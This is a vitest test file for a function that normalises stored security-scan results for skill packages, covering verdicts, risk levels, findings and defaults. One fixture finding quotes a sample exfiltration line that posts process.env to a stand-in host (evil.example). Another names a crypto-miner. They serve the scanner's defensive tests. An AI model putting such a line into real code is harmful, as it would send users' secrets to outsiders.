import { describe, expect, it } from "vitest";
import {
  buildSecurityScanFromFields,
  SkillScanFieldRow,
  SkillSecurityScan,
} from "@/lib/securityScan";

const baseRow: SkillScanFieldRow = {
  scan_verdict: "avoid",
  scan_risk: "high",
  scan_truncated: false,
  scan_scanned_at: "2026-05-30T00:00:00.000Z",
  scan_model: "google/gemini-2.5-flash-lite",
  scan_rubric_version: "v2",
  scan_source: "model",
  scan_generated_by_model: true,
};

// Build a valid row where `scan_verdict` is a live, non-null, valid
// review/avoid DB row — the only shape live callers
// (`rows[0] ? buildSecurityScanFromFields(row) : null`,
// `buildSecurityScanFromFields(skill)`, etc.) ever pass. For such rows the
// normalized scan is non-null, so we assert once at the helper rather than
// repeating non-null assertions at every property access.
function assertScan(
  overrides: Partial<SkillScanFieldRow> = {}
): SkillSecurityScan {
  const scan = buildSecurityScanFromFields({ ...baseRow, ...overrides });
  if (scan === null) {
    throw new Error(
      "expected a valid review/avoid row to normalize to a non-null scan"
    );
  }
  return scan;
}

describe("buildSecurityScanFromFields — verdict gating", () => {
  it("returns a fully normalized scan for a valid 'review' row", () => {
    const scan = assertScan({
      scan_verdict: "review",
      scan_risk: "medium",
      scan_findings: [],
    });
    expect(scan).toEqual({
      verdict: "review",
      risk: "medium",
      findings: [],
      truncated: false,
      scanned_at: "2026-05-30T00:00:00.000Z",
      model: "google/gemini-2.5-flash-lite",
      rubric_version: "v2",
      scan_source: "model",
      generated_by_model: true,
      advisory: true,
    });
  });

  it("returns null for verdicts outside the allowed review/avoid set", () => {
    // The scanner is contractually review|avoid only. A corrupt or unknown
    // stored verdict must not leak a bogus verdict into the rendered UI.
    for (const bad of [
      undefined,
      null,
      "",
      "safe",
      "allow",
      "ok",
      "SAFE",
      "pass",
    ]) {
      expect(
        buildSecurityScanFromFields({ ...baseRow, scan_verdict: bad })
      ).toBeNull();
    }
  });
});

describe("buildSecurityScanFromFields — risk normalization", () => {
  it("keeps valid low/medium/high risks", () => {
    for (const risk of ["low", "medium", "high"] as const) {
      expect(
        buildSecurityScanFromFields({ ...baseRow, scan_risk: risk })
      ).toHaveProperty("risk", risk);
    }
  });

  it("collapses unknown or missing risk to null", () => {
    expect(
      buildSecurityScanFromFields({ ...baseRow, scan_risk: "critical" })
    ).toHaveProperty("risk", null);
    expect(
      buildSecurityScanFromFields({ ...baseRow, scan_risk: undefined })
    ).toHaveProperty("risk", null);
    expect(
      buildSecurityScanFromFields({ ...baseRow, scan_risk: null })
    ).toHaveProperty("risk", null);
  });
});

describe("buildSecurityScanFromFields — findings normalization", () => {
  it("keeps valid findings with defaults for missing fields", () => {
    const scan = assertScan({ scan_findings: [{ severity: "medium" }] });
    expect(scan.findings).toEqual([
      {
        severity: "medium",
        category: "unknown",
        detail: "",
        evidence: "",
        file: "SKILL.md",
      },
    ]);
  });

  it("preserves explicitly provided fields", () => {
    const scan = assertScan({
      scan_findings: [
        {
          severity: "high",
          category: "data-exfil",
          detail: "Sends environment secrets to a remote host.",
          evidence: "fetch('https://evil.example', { body: process.env })",
          file: "scripts/install.sh",
        },
      ],
    });
    expect(scan.findings[0]).toEqual({
      severity: "high",
      category: "data-exfil",
      detail: "Sends environment secrets to a remote host.",
      evidence: "fetch('https://evil.example', { body: process.env })",
      file: "scripts/install.sh",
    });
  });

  it("treats explicit-null category/evidence/file as the unknown defaults", () => {
    const scan = assertScan({
      scan_findings: [
        { severity: "low", category: null, evidence: null, file: null },
      ],
    });
    expect(scan.findings[0].category).toBe("unknown");
    expect(scan.findings[0].evidence).toBe("");
    expect(scan.findings[0].file).toBe("SKILL.md");
  });

  it("parses a JSON string of findings", () => {
    const json = JSON.stringify([
      {
        severity: "medium",
        category: "crypto-miner",
        detail: "Dumps GPU to a miner.",
        evidence: "node",
        file: "scripts/run",
      },
    ]);
    const scan = assertScan({ scan_findings: json });
    expect(scan.findings).toHaveLength(1);
    expect(scan.findings[0]).toEqual({
      severity: "medium",
      category: "crypto-miner",
      detail: "Dumps GPU to a miner.",
      evidence: "node",
      file: "scripts/run",
    });
  });

  it("returns an empty findings array for a JSON string that is not an array", () => {
    const scan = assertScan({
      scan_findings: JSON.stringify({ not: "an array" }),
    });
    expect(scan.findings).toEqual([]);
  });

  it("returns an empty findings array for malformed JSON", () => {
    const scan = assertScan({ scan_findings: "{ not json" });
    expect(scan.findings).toEqual([]);
  });

  it("returns an empty findings array when the value is not a string or array", () => {
    for (const value of [null, undefined, 0, false, { severity: "low" }]) {
      const scan = assertScan({ scan_findings: value });
      expect(scan.findings).toEqual([]);
    }
  });

  it("filters out findings with an invalid or missing severity and non-object entries", () => {
    const scan = assertScan({
      scan_findings: [
        { severity: "medium" }, // keep
        { severity: "invalid" }, // drop
        { detail: "no severity" }, // drop
        null, // drop
        "junk", // drop
        42, // drop
      ],
    });
    expect(scan.findings).toHaveLength(1);
    expect(scan.findings[0].severity).toBe("medium");
  });
});

describe("buildSecurityScanFromFields — field defaults and coercion", () => {
  it("coerces truncated via Boolean and keeps advisory true", () => {
    expect(
      buildSecurityScanFromFields({ ...baseRow, scan_truncated: true })
    ).toHaveProperty("truncated", true);
    expect(
      buildSecurityScanFromFields({ ...baseRow, scan_truncated: false })
    ).toHaveProperty("truncated", false);
    expect(
      buildSecurityScanFromFields({ ...baseRow, scan_truncated: null })
    ).toHaveProperty("truncated", false);
    expect(
      buildSecurityScanFromFields({ ...baseRow, scan_truncated: undefined })
    ).toHaveProperty("truncated", false);
    expect(
      buildSecurityScanFromFields({ ...baseRow, scan_truncated: undefined })
    ).toHaveProperty("advisory", true);
  });

  it("serializes scanned_at to an ISO string and nulls it out when missing", () => {
    const now = new Date("2026-05-30T00:00:00.000Z");
    expect(
      buildSecurityScanFromFields({ ...baseRow, scan_scanned_at: now })
    ).toHaveProperty("scanned_at", "2026-05-30T00:00:00.000Z");

    expect(
      buildSecurityScanFromFields({ ...baseRow, scan_scanned_at: null })
    ).toHaveProperty("scanned_at", null);
  });

  it("applies model/rubric/source/generation defaults", () => {
    const scan = assertScan({
      scan_risk: null,
      scan_scanned_at: null,
      scan_model: undefined,
      scan_rubric_version: undefined,
      scan_source: undefined,
      scan_generated_by_model: undefined,
    });
    expect(scan.model).toBe("unknown");
    expect(scan.rubric_version).toBe("unknown");
    expect(scan.scan_source).toBe("model");
    expect(scan.generated_by_model).toBe(true);
  });

  it("uses an empty array as a neutral baseline and never invents findings", () => {
    const scan = assertScan({ scan_findings: [] });
    expect(scan.findings).toEqual([]);
  });
});
